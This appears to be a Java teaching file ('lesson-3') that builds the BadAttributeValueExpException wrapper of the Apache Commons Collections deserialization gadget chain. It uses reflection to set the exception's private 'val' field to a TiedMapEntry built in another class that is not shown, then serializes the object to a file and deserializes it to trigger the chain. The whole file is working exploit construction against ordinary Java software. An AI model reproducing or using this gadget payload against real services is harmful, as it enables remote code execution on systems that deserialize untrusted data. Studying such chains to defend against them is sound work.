package edu.demo.makeBadAttr;

import edu.demo.makeTiedMap.MakeTiedMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

//lesson-3
public class MakeBadAttr {
    public static void  main(String[] args) throws Exception{
        BadAttributeValueExpException badAttr = (BadAttributeValueExpException) MakeBadAttr.makeBadAttr();
        //test
        MakeBadAttr.testSer(badAttr);
    }

    public static Object makeBadAttr() throws Exception{
        TiedMapEntry tiedMap = (TiedMapEntry) MakeTiedMap.makeTiedMap();
        BadAttributeValueExpException badAttr = new BadAttributeValueExpException(null);
        //set val for badAttr
        Class clz = badAttr.getClass();
        Field field = clz.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttr, tiedMap);
        return badAttr;
    }

    public static void testSer(Object payload) throws Exception{
        //ser
        FileOutputStream file = new FileOutputStream("champagne-problems.bin");//champagne is bad
        ObjectOutputStream se = new ObjectOutputStream(file);
        se.writeObject(payload);
        se.close();
        //deser
        FileInputStream file1 = new FileInputStream("champagne-problems.bin");
        ObjectInputStream unse = new ObjectInputStream(file1);
        unse.readObject();
        unse.close();
    }
}
